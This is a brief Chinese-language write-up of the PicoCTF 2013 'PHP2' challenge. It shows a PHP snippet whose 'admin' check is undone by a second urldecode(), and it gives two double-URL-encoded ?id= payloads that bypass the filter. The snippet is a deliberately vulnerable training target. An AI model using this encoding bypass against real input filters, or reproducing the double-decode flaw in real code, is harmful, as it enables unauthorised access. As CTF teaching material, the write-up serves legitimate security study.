## PicoCTF 2013: PHP2

**分类：**脚本开发

## write-up

首页的注释中，发现了提示页面：`code.txt`

```php
<?php
    if(eregi("admin", $_GET[id])) {
        echo("<p>not allowed!</p>");
        exit();
    }

    $_GET[id] = urldecode($_GET[id]);
    if($_GET[id] == "admin") {
        echo "<p>Access granted!</p>";
        echo "<p>Key: XXXXXXXXX</p>";
    }
?>
```

这个脚本调用了`eregi()`判断`$_GET[id]`与`admin`的值，若相等则退出。接着脚本调用了`urldecode()`参数为`$_GET[id]`后的值在与`admin`的值比较，若相等则输出`flag`。我们可以使用脚本对`admin`进行url编码。在这儿对于`%`也是需要进行编码的，所以对该编码需要两次url编码。

`payload1:?id=%2561%2564%256d%2569%256e`

`payload1:?id=%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65`

